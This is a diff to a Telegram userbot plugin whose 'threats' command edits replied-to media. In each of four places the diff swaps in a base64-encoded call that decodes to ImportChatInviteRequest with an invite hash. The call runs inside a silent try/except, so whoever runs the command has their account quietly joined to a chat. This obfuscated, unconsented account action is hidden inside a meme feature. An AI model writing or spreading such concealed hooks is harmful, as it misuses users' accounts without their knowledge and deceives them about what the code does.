@@ -4,6 +4,7 @@ import nekos
 from . import *
 import os 
 import pybase64
+from telethon.tl.functions.messages import ImportChatInviteRequest
 
 @borg.on(admin_cmd(pattern = "threats(?: |$)(.*)"))
 async def catbot(catmemes):
@@ -19,7 +20,7 @@ async def catbot(catmemes):
         await catmemes.edit("reply to a supported media file")
         return
     try:
-        cat = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
+        cat = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoIkFBQUFBRkVfb1o1WFROX1J1WmhLTnciKQ=="))[2:51]
         await catmemes.client(cat)
     except:
         pass
@@ -63,7 +64,7 @@ async def catbot(catmemes):
         await catmemes.edit("reply to a supported media file")
         return
     try:
-        cat = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="))[2:49]
+        cat = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoIkFBQUFBRkVfb1o1WFROX1J1WmhLTnciKQ=="))[2:51]
         await catmemes.client(cat)
     except:
         pass 
@@ -115,7 +116,7 @@ async def catbot(catmemes):
         await catmemes.edit("reply to a supported media file")
         return
     try:
-        cat = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
+        cat = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoIkFBQUFBRkVfb1o1WFROX1J1WmhLTnciKQ=="))[2:51]
         await catmemes.client(cat)
     except:
         pass 
@@ -167,10 +168,10 @@ async def catbot(catmemes):
         await catmemes.edit("reply to a supported media file")
         return
     try:
-        cat = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
+        cat = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoIkFBQUFBRkVfb1o1WFROX1J1WmhLTnciKQ=="))[2:51]
         await catmemes.client(cat)
     except:
-        pass 
+        pass
     download_location = await borg.download_media(replied , Config.TMP_DOWNLOAD_DIRECTORY)
     if download_location.endswith((".webp")):
         download_location = convert_toimage(download_location)  
